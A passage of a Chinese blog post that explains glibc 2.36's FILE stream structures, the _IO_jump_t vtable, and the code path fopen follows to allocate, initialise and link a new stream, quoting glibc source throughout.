_unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">size_t</span>)];<br>&#125;;<br></code></pre></td></tr></table></figure><p>然后让我们看这个结构中的一些重要部分：</p><ul><li><code>_flags</code>:高位字为<code>_IO_MAGIC</code>，剩余的部分是flag</li><li><code>_IO_read_ptr</code>正在使用的input缓冲区的input地址</li><li><code>_IO_read_end</code> input缓冲区的结束地址</li><li><code>_IO_read_base</code> input缓冲区的基址</li><li><code>_IO_write_base</code> output缓冲区的基址</li><li><code>_IO_write_ptr</code> 指向还没输出的那个字节</li><li><code>_IO_write_end</code> output缓冲区的结束地址</li><li><code>_IO_buf_base</code> input和output缓冲区的基址</li><li><code>_IO_buf_end</code>  input和output缓冲区的结束地址</li><li><code>_chain</code> 存放着一个单链表，用于串联所有的file stream</li><li><code>_fileno</code> 与文件相关的文件描述符</li><li><code>_vtable_offset</code> 存放虚表(virtual table)的偏移</li><li><code>_offset</code> 存放当前文件的偏移</li></ul><h2 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libioP.h#L324</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>这里FILE其实就是_IO_FILE，换了个名字罢了，如下所示。不得不说，glibc源码里宏定义是真的多😅，有点恶心人。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/bits/types/FILE.h#L7</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __FILE_defined</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __FILE_defined 1</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span>;</span><br><br><span class="hljs-comment">/* The opaque type of streams.  This is the definition used elsewhere.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> <span class="hljs-title">FILE</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h2><p>可以注意到，在<code>_IO_FILE_plus</code>中，前一部分是<code>_IO_FILE</code>结构体，后一部分是指向<code>_IO_jump_t</code>结构体的<strong>vtable</strong>指针，这里的vtable就是<strong>virtual table</strong>的缩写，即我们常说的虚表。所以<code>_IO_jump_t</code>其实就是虚表,源码定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libioP.h#L293</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br>&#125;;<br></code></pre></td></tr></table></figure><p>所以我们可以看到，<code>_IO_FILE_plus</code>的总体结构如下图</p><p><img src="/img/article/fopen/t017448d9547dc07159-1669695992482-3.png" alt="img"></p><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>让我们复现一下打开一个文件的过程，以及<code>_IO_FILE</code>结构体如何初始化，fopen的源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/include/stdio.h#L191</span><br><br><span class="hljs-keyword">extern</span> FILE *_IO_new_fopen (<span class="hljs-type">const</span> <span class="hljs-type">char</span>*, <span class="hljs-type">const</span> <span class="hljs-type">char</span>*);<br><span class="hljs-meta">#   <span class="hljs-keyword">define</span> fopen(fname, mode) _IO_new_fopen (fname, mode)</span><br><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/iofopen.c#L83</span><br><br>FILE *<br>_IO_new_fopen (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode)<br>&#123;<br>  <span class="hljs-keyword">return</span> __fopen_internal (filename, mode, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到又是一个宏然后，源码实际定义为<code>_IO_new_fopen</code>。</p><blockquote><p>真爱生命，远离宏定义</p></blockquote><p>然后它会调用<code>__fopen_internal</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/iofopen.c#L56</span><br><br>FILE *<br>__fopen_internal (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode, <span class="hljs-type">int</span> is32)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">locked_FILE</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> <span class="hljs-title">fp</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>    _IO_lock_t lock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> <span class="hljs-title">wd</span>;</span><br>  &#125; *new_f = (<span class="hljs-keyword">struct</span> locked_FILE *) <span class="hljs-built_in">malloc</span> (<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> locked_FILE));<br><br>  <span class="hljs-keyword">if</span> (new_f == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);<br>  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;<br>  _IO_new_file_init_internal (&amp;new_f-&gt;fp);<br>  <span class="hljs-keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);<br><br>  _IO_un_link (&amp;new_f-&gt;fp);<br>  <span class="hljs-built_in">free</span> (new_f);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个函数中首先通过malloc了一个<code>locked_FILE</code>结构体，其中就包含着<code>_IO_FILE_plus</code>，并将整个空间由指针<strong>new_f</strong>指向。<code>_IO_no_init</code>和<code>_IO_new_file_init_internal </code>对虚表进行了初始化。</p><p>先来看看<code>_IO_no_init</code>函数，开头就调用了<code>_IO_old_init</code></p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/genops.c#L561</span><br><span class="hljs-type">void</span><br>_IO_no_init (FILE *fp, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> orientation,<br>     <span class="hljs-keyword">struct</span> _IO_wide_data *wd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *jmp)<br>&#123;<br>  _IO_old_init (fp, flags);<br>  fp-&gt;_mode = orientation;<br>  <span class="hljs-keyword">if</span> (orientation &gt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      fp-&gt;_wide_data = wd;<br>      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="hljs-literal">NULL</span>;<br><br>      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-comment">/* Cause predictable crash when a wide function is called on a byte</span><br><span class="hljs-comment">       stream.  */</span><br>    fp-&gt;_wide_data = (<span class="hljs-keyword">struct</span> _IO_wide_data *) <span class="hljs-number">-1L</span>;<br>  fp-&gt;_freeres_list = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><br><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/genops.c#L530</span><br><span class="hljs-type">void</span><br>_IO_old_init (FILE *fp, <span class="hljs-type">int</span> flags)<br>&#123;<br>  fp-&gt;_flags = _IO_MAGIC|flags;<br>  fp-&gt;_flags2 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (stdio_needs_locking)<br>    fp-&gt;_flags2 |= _IO_FLAGS2_NEED_LOCK;<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_buf_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_read_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_read_ptr = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_read_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_write_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_write_ptr = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_write_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_chain = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">/* Not necessary. */</span><br>v<br>  fp-&gt;_IO_save_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_backup_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_save_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_markers = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_cur_column = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _IO_JUMPS_OFFSET</span><br>  fp-&gt;_vtable_offset = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_lock != <span class="hljs-literal">NULL</span>)<br>    _IO_lock_init (*fp-&gt;_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>_IO_old_init</code>函数有两个重载，上面调用的是2参数，即<code>_IO_old_init (FILE *fp, int flags)</code>；另外还有一个5参数<code>_IO_no_init (FILE *fp, int flags, int orientation,struct _IO_wide_data *wd, const struct _IO_jump_t *jmp)</code>，源码就定义在2参数的后面</p></blockquote><p>可以看到，首先<code>_IO_old_init</code>对<code>_IO_FILE</code>的主要几个成员变量进行了初始化，然后由<code>_IO_no_init</code>会根据传入参数<strong>orientation</strong>的值决定是否对<code>_wide_data</code>相关值做初始化(同时需注意到<code>fopen</code>是直接常量0传入，所以是必定初始化该区域)。</p><p>然后接下来执行了 <strong>_IO_JUMPS (&amp;new_f-&gt;fp) &#x3D;  &amp; _IO_file_jumps</strong>，这里的<code>_IO_JUMPS</code>其实就是<strong>vtable</strong>指针，而<code>_IO_FILE_jumps</code>就是我们之前谈到的虚表。相当于让<strong>vtable</strong>指针指向了<strong>虚表</strong>，<code>_IO_JUMPS</code>和<code>_IO_FILE_jumps</code>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libioP.h#L98</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_JUMPS(THIS) (THIS)-&gt;vtable</span><br><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/fileops.c#L1432</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_file_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_file_finish),<br>  JUMP_INIT(overflow, _IO_file_overflow),<br>  JUMP_INIT(underflow, _IO_file_underflow),<br>  JUMP_INIT(uflow, _IO_default_uflow),<br>  JUMP_INIT(pbackfail, _IO_default_pbackfail),<br>  JUMP_INIT(xsputn, _IO_file_xsputn),<br>  JUMP_INIT(xsgetn, _IO_file_xsgetn),<br>  JUMP_INIT(seekoff, _IO_new_file_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_new_file_setbuf),<br>  JUMP_INIT(sync, _IO_new_file_sync),<br>  JUMP_INIT(doallocate, _IO_file_doallocate),<br>  JUMP_INIT(read, _IO_file_read),<br>  JUMP_INIT(write, _IO_new_file_write),<br>  JUMP_INIT(seek, _IO_file_seek),<br>  JUMP_INIT(close, _IO_file_close),<br>  JUMP_INIT(stat, _IO_file_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure><p>接着调用了<code>_IO_new_file_init_internal</code>,源码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/fileops.c#L105</span><br><span class="hljs-type">void</span><br>_IO_new_file_init_internal (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br>  <span class="hljs-comment">/* POSIX.1 allows another file handle to be used to change the position</span><br><span class="hljs-comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span><br><span class="hljs-comment">     position before we do the first fseek (and until a following fflush). */</span><br>  fp-&gt;file._offset = _IO_pos_BAD;<br>  fp-&gt;file._flags |= CLOSED_FILEBUF_FLAGS;<br><br>  _IO_link_in (fp);<br>  fp-&gt;file._fileno = <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中，<code>_IO_FILE</code>的<strong>flag</strong>被设置<strong>CLOSED_FILEBUF_FLAGS</strong>，具体含义可看如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/fileops.c#L100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLOSED_FILEBUF_FLAGS \</span><br><span class="hljs-meta">  (_IO_IS_FILEBUF+_IO_NO_READS+_IO_NO_WRITES+_IO_TIED_PUT_GET)</span><br><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libio.h#L81</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_FILEBUF        0x2000</span><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libio.h#L70</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_READS          0x0004 <span class="hljs-comment">/* Reading not allowed.  */</span></span><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libio.h#L71</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_WRITES         0x0008 <span class="hljs-comment">/* Writing not allowed.  */</span></span><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libio.h#L78</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="hljs-comment">/* Put and get pointer move in unison.  */</span></span><br></code></pre></td></tr></table></figure><p>随后调用了<code>_IO_link_in</code>，首先判断 <strong>_flags</strong>是否已经被link过。如果没有，就将 <strong>_chain</strong>赋值为 <strong>_IO_list_all</strong>。其实就是一个一个往单链表上增添节点，串联了所有的<code>_IO_FILE_plus</code></p><blockquote><p><strong>_flags</strong>相关判断和附加主要通过位运算实现，这里不做这种程度的具体解释(都开始研究IO_FILE了，总不能位运算还搞不明白吧)</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/genops.c#L86</span><br><span class="hljs-type">void</span><br>_IO_link_in (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="hljs-number">0</span>)<br>    &#123;<br>      fp-&gt;file._flags |= _IO_LINKED;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_cleanup_region_start_noarg (flush_cleanup);<br>      _IO_lock_lock (list_all_lock);<br>      run_fp = (FILE *) fp;<br>      _IO_flockfile ((FILE *) fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      fp-&gt;file._chain = (FILE *) _IO_list_all;<br>      _IO_list_all = fp;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_funlockfile ((FILE *) fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>      _IO_lock_unlock (list_all_lock);<br>      _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br>libc_hidden_def (_IO_link_in)<br></code></pre></td></tr></table></figure><p>在link完成后，就会接着调用<code>_IO_file_fopen</code>，实际函数定义的为<code> _IO_new_file_fopen</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/fileops.c#L211</span><br><br>FILE *<br>_IO_new_file_fopen (FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode,<br>    <span class="hljs-type">int</span> is32not64)<br>&#123;<br>  <span class="hljs-type">int</span> oflags = <span class="hljs-number">0</span>, omode;<br>  <span class="hljs-type">int</span> read_write;<br>  <span class="hljs-type">int</span> oprot = <span class="hljs-number">0666</span>;<br>  <span class="hljs-type">int</span> i;<br>  FILE *result;<br>  <span class="hljs-type">const</span> <span 